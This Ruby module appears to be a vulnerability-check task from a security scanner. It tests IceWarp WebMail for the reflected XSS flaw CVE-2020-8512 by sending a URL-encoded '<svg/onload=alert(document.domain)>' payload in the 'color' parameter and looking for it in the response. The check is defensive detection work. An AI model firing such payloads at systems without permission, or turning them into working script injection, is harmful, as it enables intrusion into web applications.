module Intrigue
  module Task
  class IceWarpCve20208512 < BaseTask

    def self.metadata
      {
        :name => "vuln/icewarp_xss_cve_2020_8512",
        :pretty_name => "Vuln Check - IceWarp WebMail XSS (CVE-2020-8512)",
        :identifiers => [{ "cve" =>  "CVE-2020-8512" }],
        :authors => ["shpendk", "jcran"],
        :description => "XSS in IceWarp WebMail",
        :references => [
          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8512"
        ],
        :type => "vuln_check",
        :passive => false,
        :allowed_types => ["Uri"],
        :example_entities => [ {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}} ],
        :allowed_options => [  ],
        :created_types => []
      }
    end

    def verify_vuln(res)
      if "#{res}".include? "<svg/onload=alert(document.domain)>"
        return true
      end
      false
    end


    ## Default method, subclasses must override this
    def run
      super

      #require_enrichment
      path = "/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22"
      uri = _get_entity_name

      # endpoints
      endpoint1 = "#{uri}#{path}"
      endpoint2 = "#{uri}:32000#{path}"

      # request 1
      response = http_get_body endpoint1
      is_vuln = verify_vuln(response)

      # check vuln on request1
      unless is_vuln
        # not vuln. lets try endpoint2
        response = http_get_body endpoint2
        is_vuln = verify_vuln(response)
      end

      # log if vulnerable
      if is_vuln
        _log "Vulnerable!"
        _create_linked_issue("icewarp_xss_cve_2020_8512", {
          proof: {
            response: response
          }
        })
      else
        _log "Not Vulnerable!"
      end
    end
  end
  end
  end
